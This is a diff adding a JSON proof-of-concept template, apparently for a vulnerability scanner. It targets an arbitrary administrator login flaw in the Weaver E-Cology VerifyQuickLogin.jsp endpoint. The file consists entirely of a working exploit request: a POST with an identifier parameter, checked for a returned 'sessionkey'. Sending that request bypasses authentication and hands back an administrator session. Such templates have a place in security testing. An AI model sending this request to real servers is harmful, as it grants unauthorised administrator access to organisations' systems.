@@ -1,0 +1,19 @@
+{
+  "poc": "泛微-E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞",
+  "req":[
+    {
+      "method": "POST",
+      "uri": "/mobile/plugin/VerifyQuickLogin.jsp",
+      "headers":{
+        "user-agent": "5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+        "content-type": ""
+      },
+      "data": "identifier=1&language=1&ipaddress=x.x.x.x",
+      "check":{
+        "status": 200,
+        "header_words": [],
+        "body_words": ["sessionkey"]
+      }
+    }
+  ]
+}
